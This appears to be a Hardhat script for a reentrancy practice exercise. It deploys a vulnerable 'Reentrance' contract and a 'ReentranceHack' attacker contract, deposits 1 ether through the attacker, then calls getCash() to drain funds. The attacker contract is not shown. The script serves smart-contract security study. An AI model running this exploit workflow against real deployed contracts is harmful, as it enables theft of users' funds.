const {hre, ethers} = require("hardhat")
const {utils} = require("ethers")

async function main() {


  const account = await ethers.getSigners()

  // get account 

  const re = await ethers.getContractFactory("contracts/Reentrance.sol:Reentrance")
  const re_h = await ethers.getContractFactory("ReentranceHack")

  console.log("1")
  const re_deploy = await re.deploy()
  console.log("2")
  const re_h_deploy = await re_h.deploy(re_deploy.address, account[0].address)

  console.log("3")
  const donate = await re_h_deploy.connect(account[0]).donatee({value: ethers.utils.parseEther("1"),gasLimit: 3000000 });

  console.log("About to send cash")
  await re_h_deploy.connect(account[0]).getCash();
  console.log("Cash grab")

}

main()
.then(() => process.exit(0))
.catch((error)=> {
  console.error(error);
  process.exit(1);
});